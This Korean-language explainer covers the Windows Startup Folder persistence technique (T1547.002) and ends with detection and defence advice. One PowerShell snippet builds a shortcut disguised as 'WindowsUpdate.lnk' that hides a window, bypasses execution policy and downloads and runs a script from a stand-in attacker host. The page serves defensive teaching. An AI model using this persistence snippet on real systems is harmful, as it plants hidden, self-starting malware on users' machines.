T1547.002: Startup Folder

Persistence

Startup Folder

시작 프로그램 폴더에 악성 파일 배치 — 로그인 시 자동 실행

#1. 시작 폴더란?

📂 ➜ 🔗 ➜ 🔄 ➜ 💥

"시작 프로그램 폴더에 파일 드롭하기"

Windows의 시작 프로그램 폴더(Startup Folder)는 사용자가 로그인하면 자동으로 실행되는 프로그램을 모아둔 특별한 폴더입니다. 이 폴더에 파일을 넣어두기만 하면 로그인할 때마다 자동 실행됩니다. 공격자는 이 간단한 메커니즘을 이용해 악성코드를 심습니다.

시작 폴더 경로

# 현재 사용자 시작 폴더
%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
# 모든 사용자 공용 시작 폴더 (관리자 권한 필요)
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup

왜 위험한가?

간단한 공격

레지스트리 수정 없이 파일 복사만으로 지속성 확보가 가능합니다.

바로가기(.lnk) 활용

바로가기 파일로 위장하면 실제 악성 파일은 다른 경로에 숨길 수 있습니다.

#2. 공격 기법 분석

악성 바로가기(.lnk) 배치

공격자는 악성 바로가기 파일을 시작 폴더에 배치하여 로그인마다 악성 명령을 실행합니다.

# PowerShell로 악성 바로가기 생성
$ws = New-Object -ComObject WScript.Shell
$lnk = $ws.CreateShortcut(
  "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\WindowsUpdate.lnk")
$lnk.TargetPath = "powershell.exe"
$lnk.Arguments = "-w hidden -ep bypass -c IEX(IWR 'https://c2.evil.com/payload.ps1')"
$lnk.IconLocation = "shell32.dll,14"
$lnk.Save()

공격 변형 패턴

1.

직접 실행 파일 배치: .exe, .bat, .vbs 파일을 직접 시작 폴더에 복사하여 로그인 시 자동 실행

2.

바로가기 위장: 정상 프로그램 아이콘으로 위장한 .lnk 파일이 실제로는 PowerShell 명령 실행

3.

All Users 폴더: 관리자 권한으로 ProgramData의 공용 시작 폴더에 배치하면 모든 사용자에게 영향

탐지 및 방어 전략

🛡️

시작 폴더 모니터링: Sysmon으로 시작 폴더의 파일 생성/변경 이벤트를 실시간 감지

🛡️

GPO 제한: 그룹 정책으로 시작 폴더의 프로그램 실행을 제한하거나 허용 목록 적용

🛡️

바로가기 분석: .lnk 파일의 대상 경로와 인수를 분석하여 의심스러운 명령 탐지
